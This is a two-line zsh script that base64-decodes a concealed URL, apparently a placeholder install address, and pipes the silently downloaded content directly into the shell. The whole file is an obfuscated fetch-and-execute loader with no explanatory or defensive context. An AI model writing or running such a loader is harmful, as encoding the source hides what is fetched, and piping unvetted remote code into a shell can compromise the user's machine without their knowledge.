#!/bin/zsh
curl -s $(echo "aHR0cHM6Ly9leGFtcGxlLmludmFsaWQvaW5zdGFsbA==" | openssl base64 -d -A) | zsh
